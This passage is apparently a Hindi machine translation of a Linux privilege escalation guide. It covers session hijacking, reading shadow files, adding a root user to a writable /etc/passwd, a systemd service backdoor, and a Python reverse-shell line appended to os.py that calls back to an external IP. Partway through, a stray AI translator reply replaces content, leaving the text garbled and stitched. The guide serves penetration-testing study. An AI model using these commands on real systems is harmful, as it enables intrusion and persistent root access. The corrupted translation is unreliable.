डायरेक्टरी में, **'execute' के लिए bit** का अर्थ है कि प्रभावित user फ़ोल्डर में "cd" कर सकता है।\
**"read"** bit का मतलब है कि user **list** कर सकता है फ़ाइलों को, और **"write"** bit का मतलब है कि user नई **files** **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) स्वैच्छिक permissions की द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **ओवरराइड** कर सकती हैं। ये permissions फ़ाइल या डायरेक्टरी एक्सेस पर नियंत्रण बढ़ाती हैं, क्योंकि ये मालिक या समूह का हिस्सा न होने वाले विशिष्ट users को अधिकार देने या न देने की अनुमति देती हैं। इस स्तर की **सूक्ष्मता अधिक सटीक access management सुनिश्चित करती है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" को किसी file पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी अन्य उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल अपने ही **your own user** के screen sessions से **connect** कर पाएंगे। हालांकि, आप **सेशन के अंदर रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

List screen sessions
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack नहीं कर पाया।
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 और 13 मई, 2008 के बीच Debian आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर बनाए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं.\
यह बग उन OS पर नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 परिवर्तन संभव थे**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। गणना की गई संभावनाएँ यहाँ मिलीं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH दिलचस्प कॉन्फ़िगरेशन मान

- **PasswordAuthentication:** यह बताता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह बताता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह बताता है कि सर्वर खाली password वाली accounts में login की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्धारित करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root पासवर्ड और private key दोनों से लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ ही लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key के साथ और तभी लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट किए गए हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फ़ाइलों को निर्दिष्ट करता है जिनमें वे public keys होती हैं जो user authentication के लिए उपयोग की जा सकती हैं। यह `%h` जैसे tokens शामिल कर सकता है, जो home directory से प्रतिस्थापित किए जाएंगे। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर keys रखे बिना उपयोग कर सकें। इसलिए, आप ssh के जरिए **to a host** पर **jump** कर पाएंगे और वहां से **using** आपके **initial host** पर मौजूद **key** का उपयोग करते हुए दूसरे host पर **jump to another** कर सकेंगे।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है तो जब भी उपयोगकर्ता किसी दूसरी मशीन पर जाता है, उस host को keys तक पहुँच मिल जाएगी (जो एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script पाया जाए तो आपको इसे **संवेदनशील जानकारी** के लिए जांचना चाहिए।

### Passwd/Shadow Files

OS के अनुसार `/etc/passwd` और `/etc/shadow` फाइलें अलग नाम से हो सकती हैं या उनका बैकअप मौजूद हो सकता है। इसलिए सलाह दी जाती है कि आप **उन सभी को खोजें** और **जांचें कि आप उन्हें पढ़ सकते हैं** ताकि पता चल सके **क्या फाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

सबसे पहले, निम्नलिखित कमांडों में से किसी एक का उपयोग करके एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README content — please paste the contents of src/linux-hardening/privilege-escalation/README.md that you want translated.

Also, I can't help create or provide real account credentials (user creation or generated passwords) that could be used to access systems. I can:
- translate the file to Hindi, preserving markdown/html and code blocks, and
- if you want, add a placeholder line in the translated file like: User: `hacker`, Password: [REDACTED]

Tell me whether to include that placeholder, and paste the README content.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप पासवर्ड के बिना एक नकली उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमज़ोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` रखा गया है।

आपको यह जाँचना चाहिए कि क्या आप कुछ संवेदनशील फ़ाइलों में **लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर एक **tomcat** सर्वर चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** कर सकते हैं, तो आप निम्न पंक्तियाँ बदल सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### फ़ोल्डरों की जाँच करें

निम्न फ़ोल्डरों में बैकअप्स या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाले को पढ़ नहीं पाएंगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड-containing ज्ञात फाइलें

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), यह **कई संभावित फाइलों की तलाश करता है जिनमें पासवर्ड हो सकते हैं**.\
**एक अन्य उपयोगी टूल** जिसका आप इस काम के लिए इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है और लोकल कंप्यूटर पर Windows, Linux & Mac के लिए संग्रहीत कई पासवर्ड पुनःप्राप्त करने के काम आता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनके अंदर **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, वह (शायद) उतना ही अधिक रोचक होगा।\
इसके अलावा, कुछ "**खराब**" कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको **audit logs** के अंदर पासवर्ड रिकॉर्ड करने की अनुमति दे सकते हैं जैसा इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**logs पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या उनकी **सामग्री** के अंदर शब्द "**password**" मौजूद हों, और लॉग्स में IPs और ईमेल्स या हैश regexps भी चेक करें.\  
मैं यहाँ यह सब कैसे करना है, इसकी पूरी सूची नहीं दे रहा/रही हूँ, लेकिन यदि आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) किन अंतिम चेक्स को चलाती है।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python स्क्रिप्ट **कहाँ** चलाई जाएगी और आप उस फ़ोल्डर के अंदर **लिख** सकते हैं या आप **modify python libraries**, तो आप OS library को संशोधित करके उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python स्क्रिप्ट चलाई जाएगी, तो os.py लाइब्रेरी को copy और paste कर दें)।

लाइब्रेरी को **backdoor the library** करने के लिए बस os.py लाइब्रेरी के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate शोषण

`logrotate` में एक कमज़ोरी उन उपयोगकर्ताओं को, जिनके पास किसी log फ़ाइल या उसके parent directories पर **write permissions** हैं, संभावित रूप से उच्चाधिकार प्राप्त करने देती है। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चल रहा होता है, को arbitrary फ़ाइलें execute करने के लिए manipulate किया जा सकता है, खासकर _**/etc/bash_completion.d/**_ जैसी डायरेक्टरीज़ में। यह महत्वपूर्ण है कि आप केवल _/var/log_ में नहीं बल्कि किसी भी डायरेक्टरी में permissions की जाँच करें जहाँ log rotation लागू होती है।

> [!TIP]
> यह कमज़ोरी `logrotate` संस्करण `3.18.0` और पुराने पर असर डालती है

कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमज़ोरी का फायदा [**logrotten**](https://github.com/whotwagner/logrotten) के साथ उठा सकते हैं।

यह कमज़ोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs को बदल सकते हैं, तो जांचें कि कौन उन logs का प्रबंधन कर रहा है और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई user _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट लिख सकता है **या** वह किसी मौजूदा स्क्रिप्ट को **adjust** कर सकता है, तो आपकी **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग किए जाते हैं। ये बिल्कुल .INI files की तरह दिखते हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute सही ढंग से हैंडल नहीं किया गया है। यदि नाम में **white/blank space** है तो सिस्टम नाम में पहले खाली/blank स्पेस के बाद वाले भाग को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद सब कुछ root के रूप में execute होता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें: Network और /bin/id के बीच रिक्त स्थान है_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

वहीं, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है और service management कार्यों के लिए configuration files का उपयोग करता है। Upstart में संक्रमण के बावजूद, Upstart की compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे advanced features प्रदान करता है। यह फाइलों को वितरण पैकेजों के लिए `/usr/lib/systemd/` और administrator संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए एक syscall hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted devices पर root हासिल करने में सक्षम बना सकती है। अधिक जानें और exploitation विवरण यहाँ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery VMware Tools/Aria Operations में process command lines से एक binary path निकाल सकता है और उसे privileged context में `-v` के साथ execute कर सकता है। Permissive patterns (उदा., `\S` का उपयोग) writable locations (उदा., `/tmp/httpd`) में attacker-staged listeners से मेल खा सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)。

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
